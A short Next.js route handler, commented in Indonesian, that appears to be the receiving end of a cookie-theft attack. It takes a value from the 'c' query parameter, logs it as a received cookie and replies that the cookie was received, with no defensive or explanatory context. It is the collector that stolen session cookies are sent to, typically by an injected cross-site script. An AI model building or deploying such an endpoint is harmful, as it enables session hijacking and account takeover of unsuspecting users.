import { NextResponse } from 'next/server';

export async function GET(request) {
  // Mengambil URL search parameters
  const { searchParams } = new URL(request.url);
  
  // Mengambil nilai dari parameter 'c'
  const cookie = searchParams.get('c');

  console.log('--- COOKIE RECEIVED (App Router) ---');
  console.log(cookie);
  console.log('------------------------------------');

  // Mengirim respons JSON
  return NextResponse.json({ status: 'ok', message: 'Cookie received' });
}